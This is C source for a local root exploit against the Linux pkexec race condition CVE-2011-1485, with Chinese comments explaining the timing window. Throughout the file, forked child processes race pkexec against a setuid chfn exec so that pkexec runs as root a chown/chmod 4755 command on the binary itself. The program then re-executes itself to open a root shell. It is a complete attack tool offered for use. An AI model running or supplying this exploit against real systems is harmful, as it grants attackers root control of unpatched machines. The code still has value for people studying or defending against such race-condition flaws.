/*
* Exploit Title: pkexec Race condition (CVE-2011-1485) exploit
* Author: xi4oyu
* Tested on: rhel 6
* CVE : 2011-1485
* Linux pkexec exploit by xi4oyu , thx dm@0x557.org * Have fun~
¡Á U can reach us  @ http://www.wooyun.org :)
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <time.h>
#include <unistd.h>
#include <termios.h>
#include <errno.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

/*
 *grandfather		pip1------------------>+
 *    -->sonL1		pip2<-->|              |
 *        -->sonL2	pip3<-->|     pip1<----+
 *
 *grandfather pip1 with sonL2:
 *    grandfather read, sonL2 write
 *sonL1/L2 pip2,pipe3:
 *    sonL1/L2 both read/write
 *    sonL1 对应于chfn 进程
 *    sonL2 对应于pkexec进程
 */
/*
 *
 *关于时间窗口:
 *          A              C
 *     pkexec check    polkit verify got pid
 *          |              |
 *        --+---+----------+----
 *              |
 *        chfn change
 *              B
 *
 *    如上,有3个时间点:
 *        A:pkexec 中 got caller_uid and check
 *        B:chfn exec, so 进程euid 改变为root.
 *        C:polkit 审查,got subject uid.
 *          polkit_authority_check_authorization_async
 *              -->polkit_subject_get_real
 *                  -->polkit_unix_process_get_pid (POLKIT_UNIX_PROCESS(subject)))
 *
 *    顺序:
 *        B在A/C中间.
 *    如果:
 *        B在A之前,则会打印'not match',ref '关于sleep'
 *        B在C之后,则polkit 审查出错,打印
 *            'Error executing command as another user: No authent.. agent was found'
 */

/*
 *工作原理:
 *    在fork 的sonL1及sonL2通过pkexec race condition,完成
 *        对 arg[0] file 的setuid 及chown root,
 *    在父进程中探测setuid 及 chown是否成功,如果成功
 *        re exec arg[0],这时因euid==0,所以执行/bin/sh
 */

/*
 *
 *关于子进程:
 *    chfn进程:
 *        会与pkexec进程sync到exec(xx)调用,但是比pkexec晚执行usleep(xx)
 *        因为close(0/1/2),所以会立即退出.
 *        经过实验,chfn不退出也可以成功,即真正验证是并不关心subject是否还alive.
 *    pkexec子进程,有2种退出情况:
 *        1,race 不成功,
 *            pkexec 因为'does not match' 退出. 全部信息为:
 *            User of caller (%d) does not match our uid (%d)
 *        1,race 成功,但此时
 *            此时subject 变为root,不会提示密码输入,直接执行 pkexec cmd.
 */

/*
 *关于chfn sleep:
 *    即如果不能通过pkexec的uid审查,说明chfn进程切换euid太快,需要usleep()
 *    以500us + random 步进.
 */

int main(int argc,char *argv[], char ** envp)
{

    time_t tim_seed1;
    pid_t pid_seed2;
    int result;
    struct stat stat_buff;

    char * chfn_path = "/usr/bin/chfn";
    char cmd_buff[4096];

    char * pkexec_argv[] = {
        "/usr/bin/pkexec",
        "/bin/sh",
        "-c",
        cmd_buff,
        NULL
    };
    int pipe1[2];
    int pipe2[2];
    int pipe3[2];
    pid_t pid,pid2 ;
    char * chfn_argv[] = {
        "/usr/bin/chfn",
        NULL
    };

    char buff[8];
    char read_buff[4096];
    char real_path[512];
    struct termios termios_p;

    int count = 0;
    int flag = 0;
    int usleep1 = 0;
    int usleep2 = 0;

    bzero(cmd_buff,4096);
    bzero(real_path,512);
    realpath(argv[0],real_path);

    tim_seed1 = time(NULL);
    pid_seed2 = getpid();
    srand(tim_seed1+pid_seed2);

    //get terminal attr
    tcgetattr(0,&termios_p);
    snprintf(cmd_buff,4095,"/bin/chown root:root %s; /bin/chmod 4755 %s\n",real_path,real_path);
    printf("Cmd line:%s",cmd_buff);


    if(! geteuid()){
    //Succs => r00t!
        char * exec_argv[2]={
            "/bin/sh",
            NULL
        };
        setuid(0);
        setgid(0);
        execve("/bin/sh",exec_argv,0);
        perror("execve shell");
        exit(-1);
    }

    printf("pkexec local root exploit by xi4oyu , thx to dm\n");

    if(pipe(pipe1)){
        perror("pipe");
        exit(-2);
    }

    for(count = 500; count && !flag; count--){
	printf("Count %d\n",count);
        pid = fork();
        if( !pid ){
            //sonL1
            if( !pipe(pipe2)){
                if(!pipe(pipe3)){
                    pid2 = fork();
                    if(!pid2){
                        //sonL2,son of sonL1
                        close(1);
                        close(2);
                        close(pipe1[0]);
                        //sync with grandfather,
                        dup2(pipe1[1],2);
                        dup2(pipe1[1],1);
                        close(pipe1[1]);

                        //pipe2/3 sync with parent sonL1
                        close(pipe2[0]);
                        close(pipe3[1]);
                        write(pipe2[1],"\xFF",1);
                        read(pipe3[0],&buff,1);

                        execve(pkexec_argv[0],pkexec_argv,envp);
                        perror("execve pkexec");
                        exit(-3);
                    }
                    //sonL1,parent of sonL2
                    close(0);
                    close(1);
                    close(2);
                    close(pipe2[1]);
                    close(pipe3[0]);
                    //sync with child
                    read(pipe2[0],&buff,1);
                    write(pipe3[1],"\xFF",1);

                    usleep(usleep1+usleep2);
                    execve(chfn_argv[0],chfn_argv,envp);
                    perror("execve setuid");
                    exit(1);
                }
            }
            perror("pipe3");
            exit(1);
        }

        //This is primitive parent,no pipe3 we use poll to monitor pipe1[0]
	waitpid(pid,NULL,0);	//avoid defunct for chfn
        memset(pipe3,0,8);

        struct pollfd * pollfd = (struct pollfd *)(&pipe3);
        pollfd->fd = pipe1[0];
        pollfd->events =  POLLRDNORM;    //same as POLLIN

        if(poll(pollfd,1,1000) < 0){
            perror("poll");
            exit(1);
        }

        if(pollfd->revents & POLLRDNORM ){
            memset(read_buff,0,4096);
            read(pipe1[0],read_buff,4095);
	    printf("read:%s\n",read_buff);
	    /*
	     *read_buff 信息应该如下.
	     *    User of caller (%d) does not match our uid (%d),not match 说明
	     *    chfn 进程执行的太快,没有通过pkexec 内uid的审查,所以
	     *    要增加延时执行.
	     */
            if( strstr(read_buff,"does not match")){
                usleep1 += 500;
                usleep2 = rand() % 1000;
            }else{
                usleep1 -= 500;
            }
        }

        if(!stat(real_path,&stat_buff)){
            if(!stat_buff.st_uid){
                if(!stat_buff.st_gid){
                    if(stat_buff.st_mode & 0x800){
                        char *exec_array[]={
                            real_path,
                            NULL
                        };
                        flag = 1;
                        tcsetattr(0,2,&termios_p);
                        execve(real_path,exec_array,0);
                        perror("execve self");
                        exit(1);
                    }
                }

            }
        }

        tcsetattr(0,2,&termios_p);

    }

    result = 0;
    return result;
}
